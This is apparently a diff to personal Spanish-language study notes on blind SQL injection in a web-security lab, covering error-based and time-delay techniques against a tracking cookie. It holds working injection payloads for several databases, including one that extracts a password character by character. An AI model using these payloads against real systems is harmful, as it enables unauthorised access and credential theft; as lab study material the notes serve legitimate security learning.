@@ -298,11 +298,52 @@ Ahora muestra información sensible TrackingId=' AND 1=CAST((SELECT username FRO
 
 Y la solución TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
+```
+# SQL Blind desencadenando retrasos de tiempo
+Cuando una aplicación detecta error de la base de datos y los maneja de manera adecuada no se vará ningún tipo de respuesta, esto hace que las técnicas anteriores no sean tan significativas.
+Lo que se puede realizar ahora es que en lugar de desencadenar errores, se hará desencadenar retrasos de tiempo, dependiendo la condicion inyectada
 
+Las técnicas para desencadenar un retraso en el tiempo son específicas del tipo de base de datos que se utiliza. Por ejemplo, en Microsoft SQL Server, puede utilizar el siguiente para probar una condición y desencadenar un retraso dependiendo de si la expresión es verdadera:
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'-- =>La primera de estas entradas no desencadena un retraso, porque la condición 1=2es falso.
+'; IF (1=1) WAITFOR DELAY '0:0:10'-- =>La segunda entrada desencadena un retraso de 10 segundos, porque la condición 1=1es cierto
+```
+Using this technique, we can retrieve data by testing one character at a time: 
+`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+## Laboratorio 1 SQL Injection with time delays
+```
+Dice que debemos generar un injeción que cause un delay de 10 segundos y que esta en cookie
+
+select dbms_pipe.receive_message(('a'),10) from dual;
+Consulta base  SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'
+
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';select dbms_pipe.receive_message(('a'),10) from dual;--''
+';select dbms_pipe.receive_message(('a'),10) from dual;--'
+
+SELECT * FROM tracking WHERE id = '';WAITFOR DELAY '0:0:10'--''
+
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';SELECT pg_sleep(10);--''
+SELECT pg_sleep(10)
+||SELECT pg_sleep(10)||
+'||pg_sleep(10)--
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||pg_sleep(10)--'
+
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';SELECT SLEEP(10);''
+SELECT SLEEP(10)
+
+Teniendo la consulta base
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'
+
+Por la siguiente consulta funciono:
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||pg_sleep(10)--'
+Y estas no funcionaron:
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx';SELECT pg_sleep(10);--''
+
+el ; Indica que puede haber multiples consultas que puede estar filtradas o estar configuradas para que solo haya una consulta y no multiples
 
 ```
-
-
 
 # Hola
 ## HOLA
